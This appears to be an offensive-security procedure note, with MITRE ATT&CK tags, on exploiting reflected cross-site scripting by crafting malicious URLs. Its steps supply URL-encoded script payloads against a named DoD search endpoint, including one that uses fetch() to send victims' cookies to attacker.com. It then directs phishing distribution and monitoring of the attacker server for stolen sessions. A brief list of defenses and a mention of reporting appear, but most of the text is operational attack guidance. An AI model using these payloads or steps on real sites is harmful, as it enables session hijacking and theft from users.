---
tags:
  - xss
  - reflected-xss
  - injection
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:41.242Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 9ad3acfa-fb57-4361-a2d9-1b7ce3df180f
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Craft-URL-for-Reflected-XSS-Injection

## Summary

This procedure demonstrates how to exploit a reflected cross-site scripting (XSS) vulnerability by crafting a malicious URL that injects JavaScript into a web application's response, leading to arbitrary code execution in the user's browser. It is particularly effective against sites with insufficient input validation on URL parameters, such as search fields or error messages on government websites.

## Description

In a reflected XSS attack, user-supplied input from a URL parameter is immediately echoed back in the server's response without proper escaping or sanitization. An attacker crafts a URL embedding a script tag or other JavaScript payload, which executes when the victim visits the link. This can result in stealing authentication cookies, keystroke logging, or defacing the page. The procedure targets web applications like the identified DoD site, where parameters are reflected in HTML contexts. Prerequisites include identifying a reflective endpoint via manual testing or automated scanners. Expected outcomes include script execution confirming the vulnerability, with potential for data exfiltration to an attacker-controlled domain.

## Requirements

1. Access to a web browser with developer tools enabled for testing payloads
2. Knowledge of the target URL and reflective parameters (e.g., via source code review or fuzzing)
3. Optional proxy tool like Burp Suite to intercept and modify requests
4. Victim interaction, such as clicking a phishing link

## Defense

Defensive measures and detection strategies:

- Implement content security policy (CSP) to restrict script sources
- Sanitize and encode all user inputs before rendering in HTML (use libraries like OWASP ESAPI)
- Use HTTP-only and secure flags on cookies to prevent JavaScript access
- Monitor for anomalous JavaScript execution via web application firewalls (WAFs) like ModSecurity

## Objectives

1. Inject and execute arbitrary JavaScript in the victim's browser context
2. Capture sensitive data like session tokens for unauthorized access
3. Demonstrate vulnerability to report for remediation

## Instructions

### Step 1: Identify Reflective Parameter

**Context**: Locate a URL parameter that is directly reflected in the page response without sanitization, such as a 'q' parameter in a search form.

Inspect the target page source or use developer tools to confirm reflection. For the DoD site, test endpoints like search or login redirect pages.

### Step 2: Craft Malicious Payload

**Context**: Encode a JavaScript payload to inject into the parameter, ensuring it breaks out of the HTML context and executes.

Use a simple alert for testing, or exfiltration for real impact:

```url
https://vulnerable.dod.mil/search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E
```

> This URL-encoded payload (`<script>alert(document.cookie);</script>`) injects a script that alerts the user's cookies. Expected output: An alert popup displaying cookie data if vulnerable.

### Step 3: Test and Verify Execution

**Context**: Send the crafted URL to a test browser or victim to confirm script execution.

Open the URL in a browser. Check the console for errors or execution. For exfiltration, modify to:

```url
https://vulnerable.dod.mil/search?q=%3Cscript%3Efetch('https://attacker.com/steal?cookie='+document.cookie)%3C%2Fscript%3E
```

> This sends cookies to an attacker server. Expected output: Network request to attacker domain with cookie data.

### Step 4: Escalate Impact

**Context**: Once confirmed, chain with phishing to trick users into visiting the URL, enabling session hijacking.

Distribute via email or social links. Monitor attacker server for stolen data.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[reflected-xss]]
- [[web-exploitation]]
